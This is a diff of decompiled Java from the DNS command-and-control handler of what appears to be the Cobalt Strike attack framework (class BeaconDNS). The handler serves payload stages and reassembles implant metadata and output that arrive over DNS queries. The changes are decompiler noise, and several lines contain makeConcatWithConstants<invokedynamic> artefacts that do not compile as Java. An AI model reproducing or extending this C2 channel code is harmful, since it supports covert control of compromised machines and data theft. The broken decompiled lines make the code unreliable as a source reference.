@@ -85,7 +85,8 @@ public class BeaconDNS implements DNSServer.Handler {
    }
 
    public void setPayloadStage(byte[] var1) {
-      this.stage = this.c2profile.getString(".dns-beacon.dns_stager_prepend") + ArtifactUtils.AlphaEncode(var1);
+      String var10001 = this.c2profile.getString(".dns-beacon.dns_stager_prepend");
+      this.stage = var10001 + ArtifactUtils.AlphaEncode(var1);
    }
 
    protected DNSServer.Response serveStage(String var1) {
@@ -102,8 +103,8 @@ public class BeaconDNS implements DNSServer.Handler {
          DNSServer.Response var10000;
          try {
             var10000 = this.respond_nosync(var1, var2);
-         } catch (Exception var6) {
-            MudgeSanity.logException("DNS request '" + var1 + "' type(" + var2 + ")", var6, false);
+         } catch (Exception var7) {
+            MudgeSanity.logException("DNS request '" + var1 + "' type(" + var2 + ")", var7, false);
             return this.idlemsg;
          }
 
@@ -196,10 +197,11 @@ public class BeaconDNS implements DNSServer.Handler {
 
                B("");
                String var23;
+               String var10000;
                if (!this.DNS_GET_A_INDICATOR.equals(var6) && !this.DNS_GET_TXT_INDICATOR.equals(var6) && !this.DNS_GET_AAAA_INDICATOR.equals(var6)) {
                   if (!this.DNS_PUT_METADATA_INDICATOR.equals(var6) && !this.DNS_PUT_OUTPUT_INDICATOR.equals(var6)) {
                      if (CommonUtils.isHexNumber(var6) && CommonUtils.isDNSBeacon(var6)) {
-                        var6 = CommonUtils.toNumberFromHex(var6, 0) + "";
+                        var6 = CommonUtils.toNumberFromHex(var6, 0).makeConcatWithConstants<invokedynamic>(CommonUtils.toNumberFromHex(var6, 0));
                         B("BeaconDNS.respond_nosync - Beacon ID from id: " + var6);
                         this.cache.purge();
                         this.conversations.purge();
@@ -215,6 +217,7 @@ public class BeaconDNS implements DNSServer.Handler {
                      String var18 = var7.shift();
                      char var19 = var18.charAt(0);
                      String var17 = var6;
+                     String var24;
                      if (var19 == '1') {
                         var23 = var18.substring(1);
                         var16 = var23;
@@ -222,34 +225,32 @@ public class BeaconDNS implements DNSServer.Handler {
                         var23 = var18.substring(1);
                         var12 = var7.shift();
                         var16 = var23 + var12;
-                     } else {
-                        String var24;
-                        if (var19 == '3') {
-                           var23 = var18.substring(1);
-                           var12 = var7.shift();
-                           var24 = var7.shift();
-                           var16 = var23 + var12 + var24;
-                        } else if (var19 == '4') {
-                           var23 = var18.substring(1);
-                           var12 = var7.shift();
-                           var24 = var7.shift();
-                           String var26 = var7.shift();
-                           var16 = var23 + var12 + var24 + var26;
-                        }
+                     } else if (var19 == '3') {
+                        var23 = var18.substring(1);
+                        var12 = var7.shift();
+                        var24 = var7.shift();
+                        var16 = var23 + var12 + var24;
+                     } else if (var19 == '4') {
+                        var23 = var18.substring(1);
+                        var12 = var7.shift();
+                        var24 = var7.shift();
+                        String var26 = var7.shift();
+                        var16 = var23 + var12 + var24 + var26;
                      }
 
-                     String var25 = var7.shift();
-                     var6 = CommonUtils.toNumberFromHex(var7.shift(), 0) + "";
-                     if (this.cache.contains(var6, var25)) {
-                        B("BeaconDNS.respond_nosync - Using cached entry: " + var6 + " / " + var25);
-                        return this.cache.get(var6, var25);
+                     var24 = var7.shift();
+                     var10000 = var7.shift();
+                     var6 = CommonUtils.toNumberFromHex(var10000, 0).makeConcatWithConstants<invokedynamic>(CommonUtils.toNumberFromHex(var10000, 0));
+                     if (this.cache.contains(var6, var24)) {
+                        B("BeaconDNS.respond_nosync - Using cached entry: " + var6 + " / " + var24);
+                        return this.cache.get(var6, var24);
                      } else {
-                        B("BeaconDNS.respond_nosync - Getting RECV Conversation: " + var6 + " / " + var17 + " / " + var25);
-                        RecvConversation var20 = this.conversations.getRecvConversation(var6, var17, var25);
+                        B("BeaconDNS.respond_nosync - Getting RECV Conversation: " + var6 + " / " + var17 + " / " + var24);
+                        RecvConversation var20 = this.conversations.getRecvConversation(var6, var17, var24);
                         var20.next(var16);
                         if (var20.isComplete()) {
                            B("BeaconDNS.respond_nosync - Completing Conversation...");
-                           this.conversations.removeConversation(var6, var17, var25);
+                           this.conversations.removeConversation(var6, var17, var24);
 
                            try {
                               byte[] var21 = var20.result();
@@ -262,13 +263,13 @@ public class BeaconDNS implements DNSServer.Handler {
                                  B("BeaconDNS.respond_nosync - Processing beacon callback...");
                                  this.controller.process_beacon_callback(var6, var21);
                               }
-                           } catch (Exception var22) {
-                              MudgeSanity.logException("Corrupted DNS transaction? " + var1 + ", type: " + var2, var22, false);
+                           } catch (Exception var21) {
+                              MudgeSanity.logException("Corrupted DNS transaction? " + var1 + ", type: " + var2, var21, false);
                            }
                         }
 
-                        B("BeaconDNS.respond_nosync - caching result: " + var6 + " / " + var25);
-                        this.cache.add(var6, var25, this.idlemsg);
+                        B("BeaconDNS.respond_nosync - caching result: " + var6 + " / " + var24);
+                        this.cache.add(var6, var24, this.idlemsg);
                         return this.idlemsg;
                      }
                   }
@@ -276,7 +277,8 @@ public class BeaconDNS implements DNSServer.Handler {
                   B("BeaconDNS.respond_nosync - Processing DNS indicator: " + var6);
                   var23 = var6;
                   var12 = var7.shift();
-                  var6 = CommonUtils.toNumberFromHex(var7.shift(), 0) + "";
+                  var10000 = var7.shift();
+                  var6 = CommonUtils.toNumberFromHex(var10000, 0).makeConcatWithConstants<invokedynamic>(CommonUtils.toNumberFromHex(var10000, 0));
                   if (this.cache.contains(var6, var12)) {
                      return this.cache.get(var6, var12);
                   } else {
